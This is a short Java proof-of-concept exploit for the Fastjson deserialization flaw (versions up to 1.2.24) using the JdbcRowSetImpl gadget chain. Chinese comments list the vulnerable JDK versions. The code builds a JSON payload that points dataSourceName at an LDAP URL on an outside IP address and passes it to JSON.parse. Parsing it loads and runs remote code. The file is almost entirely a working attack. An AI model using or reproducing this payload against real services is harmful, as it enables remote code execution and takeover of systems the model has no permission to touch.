package JdbcRowSetImpl;

import com.alibaba.fastjson.JSON;
/*JdbcRowSetImpl利用链POC  ：
RMI利用的JDK版本≤ JDK 6u132、7u122、8u113
LADP利用JDK版本≤ 6u211 、7u201、8u191*/
//fastjson <=1.2.24
public class exp {
    public static void main(String[] args) {
        String PoC = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://101.34.84.157:8085/zPnvpHcF\", \"autoCommit\":true}";
        JSON.parse(PoC);
    }

}
